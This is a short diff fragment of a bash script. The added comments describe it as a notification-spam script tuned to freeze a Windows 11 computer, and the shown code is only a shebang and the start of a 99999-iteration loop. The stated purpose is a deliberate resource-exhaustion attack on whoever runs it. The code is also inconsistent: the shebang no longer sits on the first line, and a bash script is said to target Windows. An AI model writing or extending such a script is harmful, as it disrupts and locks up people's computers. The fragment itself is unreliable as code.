@@ -1,3 +1,6 @@
+# Author: Nate
+# Target OS: Windows 11
+# Customization of our spam script with the number of notifications to spam set so high that the computer will freeze
 #!/bin/bash
 for i in {1..99999}; do
   (
